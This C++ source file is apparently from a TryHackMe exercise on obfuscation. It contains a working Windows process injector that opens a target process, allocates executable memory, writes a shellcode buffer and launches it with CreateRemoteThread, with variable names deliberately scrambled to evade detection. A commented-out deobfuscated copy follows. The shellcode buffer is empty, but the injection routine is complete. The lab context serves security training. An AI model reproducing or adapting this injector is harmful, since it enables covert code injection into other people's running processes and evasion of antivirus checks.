#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

// Simple process injector from https://tryhackme.com/room/obfuscationprinciples
#include "windows.h"

int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}

// Deobfuscated version
//#include "windows.h"
//#include <iostream>
//#include <string>
//using namespace std;
//
//int main(int argc, char* argv[])
//{
//	unsigned char shellcode[] = "";
//
//	HANDLE processHandle;
//	HANDLE remoteThread;
//	PVOID remoteBuffer;
//	string leaked = "This was leaked in the strings";
//
//	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
//	cout << "Handle obtained for" << processHandle;
//	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
//	cout << "Buffer Created";
//	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
//	cout << "Process written with buffer" << remoteBuffer;
//	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
//	CloseHandle(processHandle);
//	cout << "Closing handle" << processHandle;
//	cout << leaked;
//
//	return 0;
//} 
